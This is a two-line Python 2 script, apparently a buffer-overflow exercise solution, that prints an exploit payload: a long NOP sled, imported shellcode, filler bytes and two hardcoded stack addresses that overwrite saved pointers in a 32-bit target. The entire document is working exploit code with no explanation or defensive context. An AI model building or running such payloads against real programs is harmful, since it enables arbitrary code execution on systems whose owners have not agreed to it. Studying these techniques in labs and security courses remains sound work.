from shellcode import shellcode
print "\x90"*909+shellcode+"\x01" * 100 +"\xc9\x7d\xfe\xbf"+"\x80\x79\xfe\xbf"
